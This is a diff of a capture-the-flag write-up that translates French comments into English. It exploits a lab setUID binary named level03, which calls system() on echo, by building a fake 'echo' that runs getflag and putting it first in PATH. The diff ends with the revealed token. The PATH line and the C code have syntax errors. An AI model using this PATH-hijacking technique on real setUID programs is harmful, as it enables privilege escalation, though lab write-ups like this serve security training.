@@ -1,32 +1,30 @@
-#Le fichier est un binaire
-
-# J'utilise ltrace pour voir sa call stack
+#The file in our home is a binary, lets ltrace it
 
 ltrace ./level03
 
-#On vois que c'est un setUID sur les droit de flag 03 qui fais un appelle a system() a la commande echo, c'est une faille
+#We can see that's a setUID which execute an echo system command as flag03 through a call to the system() function.
 
-#On cree un dossier dans le tmp pour pouvoir agir librement
+#Let make a new directory in /tmp to have more freedom
 
 mkdir /tmp/azur
 cd /tmp/azur
 
-#On cree un fichier main.c ou l'on ecrit le programme suivant:
+#to exploit the system() call we must build an exploit, lets create a C main :
 
 void main()
 {
     system("getflag")
 }
 
-#On le compile en appelant notre binaire "echo"
+#Then, we built it as "echo"
 
 gcc main.c -o echo
 
-#On ajoute ensuite notre dossier tmp au PATH
+#We add our custom directory to the "PATH" in order to use our custom echo instead of the system one
 
 PATH:/tmp/azur:$PATH
 
-#Il nous reste plus qu'a executer le binaire sur notre home pour qu'il utilise notre version de echo
+#lets try it out
 
 ./level03
 >>>>Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
